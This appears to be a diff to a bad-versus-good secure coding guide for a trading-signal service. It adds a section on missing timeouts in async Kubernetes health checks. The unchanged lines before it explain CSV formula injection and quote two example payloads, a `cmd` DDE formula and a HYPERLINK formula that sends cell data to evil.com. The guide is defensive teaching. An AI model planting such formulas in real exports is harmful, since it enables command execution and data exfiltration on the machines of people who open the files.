@@ -4371,3 +4371,103 @@ class SignalLogger:
 ```
 
 **Разница:** The bad code writes values from the signal dict directly to CSV without sanitization. If `symbol` or `reason` starts with `=`, `+`, `-`, or `@`, Excel interprets the cell as a formula. An attacker who compromises the exchange feed or crafts market events that influence the LLM engine can inject formulas like `=cmd|'/c calc'!A1` (command execution) or `=HYPERLINK("http://evil.com/?data="&A1:B100)` (data exfiltration). With 1000 users, one analyst opening the CSV in Excel triggers the formula — full compromise of the trading desk. The good code adds a `sanitize_csv_cell()` function that prefixes dangerous characters (`=`, `+`, `-`, `@`, tab, CR, LF) with a single quote `'`. Excel treats a leading `'` as a text indicator — the cell is displayed as text, not interpreted as a formula. The cost is a ~5-line sanitize function and one extra call per cell. The benefit is zero formula injection — even if an attacker injects `=cmd|...` into the signal data, Excel displays it as harmless text. The analyst sees the malicious string and can investigate, but no code executes on their machine.
+
+---
+
+## Bad vs Good: No Timeout on Health Check Component Checks (Python)
+
+### ❌ Bad Code
+```python
+class HealthChecker:
+    async def check_readiness(self) -> dict:
+        """Readiness probe — are all dependencies connected?"""
+        components = []
+        components.append(await self._check_ws())       # 50ms normally
+        components.append(await self._check_db())       # 50ms normally
+        components.append(await self._check_redis())    # 50ms normally
+        components.append(await self._check_exchange()) # 50ms normally
+        # Total: ~200ms normally, but...
+        return {"status": overall, "components": components}
+
+    async def _check_db(self) -> ComponentHealth:
+        start = time.time()
+        health = await self.db_client.get_health()  # No timeout!
+        # If DB TCP connection is open but DB is unresponsive:
+        # - get_health() sends a query
+        # - DB doesn't respond (disk full, lock contention, OOM)
+        # - TCP keepalive doesn't trigger for 15 minutes (OS default)
+        # - get_health() hangs indefinitely
+        # - check_readiness() hangs indefinitely
+        # - The entire event loop is blocked
+        # - Signal generation stops
+        # - Order execution stops
+        # - K8s readiness probe times out after 1s → pod restarted
+        # But the event loop is still blocked on get_health()!
+        # The pod can't even process the SIGTERM for graceful shutdown
+        latency = (time.time() - start) * 1000
+        return ComponentHealth("timescaledb", HealthStatus.HEALTHY, latency, "connected")
+```
+
+**What's wrong:**
+- Each `await` has no timeout — if any component check hangs, the entire readiness probe hangs
+- Checks are sequential — 4 checks × 50ms = 200ms normally, but one hang = infinite
+- The event loop is blocked — no other coroutines (signal generation, order execution, WebSocket reads) can run
+- K8s readiness probe has `timeoutSeconds: 1` — if the check takes >1s, K8s considers the pod unhealthy and restarts it
+- But the event loop is still blocked on `get_health()` — the pod can't process the SIGTERM for graceful shutdown
+- K8s sends SIGKILL after `terminationGracePeriodSeconds: 30` — the process is killed without cleanup
+- With 1000 users, a single DB hang causes all 1000 pods to restart simultaneously — thundering herd on the DB when it recovers
+- The root cause: no timeout on individual checks + sequential execution blocks the event loop
+
+### ✅ Good Code
+```python
+import asyncio
+
+class HealthChecker:
+    async def check_readiness(self) -> dict:
+        """Readiness probe — are all dependencies connected?"""
+        # Run all checks concurrently with individual timeouts
+        tasks = [
+            asyncio.wait_for(self._check_ws(), timeout=1.0),
+            asyncio.wait_for(self._check_db(), timeout=1.0),
+            asyncio.wait_for(self._check_redis(), timeout=1.0),
+            asyncio.wait_for(self._check_exchange(), timeout=1.0),
+        ]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        components = []
+        for i, result in enumerate(results):
+            if isinstance(result, asyncio.TimeoutError):
+                name = ["websocket", "timescaledb", "redis", "exchange"][i]
+                components.append(ComponentHealth(
+                    name, HealthStatus.UNHEALTHY, 1000.0, "timeout"
+                ))
+            elif isinstance(result, Exception):
+                name = ["websocket", "timescaledb", "redis", "exchange"][i]
+                components.append(ComponentHealth(
+                    name, HealthStatus.UNHEALTHY, 0, str(result)
+                ))
+            else:
+                components.append(result)
+
+        # Determine overall status
+        statuses = [c.status for c in components]
+        if all(s == HealthStatus.HEALTHY for s in statuses):
+            overall = HealthStatus.HEALTHY
+        elif any(s == HealthStatus.UNHEALTHY for s in statuses):
+            overall = HealthStatus.UNHEALTHY
+        else:
+            overall = HealthStatus.DEGRADED
+
+        return {"status": overall.value, "components": [...]}
+
+    async def _check_db(self) -> ComponentHealth:
+        start = time.time()
+        # The wait_for in check_readiness will cancel this if it takes >1s
+        health = await self.db_client.get_health()
+        latency = (time.time() - start) * 1000
+        if health.get("connected"):
+            return ComponentHealth("timescaledb", HealthStatus.HEALTHY, latency, "connected")
+        return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, latency, "not connected")
+```
+
+**Разница:** The bad code awaits each component check sequentially with no timeout. If any check hangs (e.g., DB TCP connection is open but the DB is unresponsive due to disk full, lock contention, or OOM), the `await` blocks forever. The event loop is blocked — no other coroutines can run. Signal generation stops, order execution stops, WebSocket reads stop. K8s readiness probe times out after 1s and restarts the pod, but the event loop is still blocked on `get_health()` — the pod can't process SIGTERM for graceful shutdown. K8s sends SIGKILL after 30s, killing the process without cleanup. With 1000 users, a single DB hang causes all 1000 pods to restart simultaneously — thundering herd on the DB when it recovers. The good code wraps each check in `asyncio.wait_for(check, timeout=1.0)` and runs all 4 checks concurrently with `asyncio.gather(*tasks, return_exceptions=True)`. If any check exceeds 1s, `wait_for` cancels it and raises `TimeoutError`, which `gather` captures as an exception (not propagating it). The readiness probe returns in ≤1s regardless of component state. The event loop is never blocked — signal generation and order execution continue even during health checks. A timed-out component is reported as UNHEALTHY with "timeout" details, and K8s can restart the pod gracefully (SIGTERM is processed because the event loop is free). The cost is ~10 extra lines (wait_for, gather, exception handling). The benefit is zero event loop blocking, guaranteed ≤1s probe response, graceful K8s restarts, and no thundering herd — the pod shuts down cleanly and restarts without overwhelming the DB.
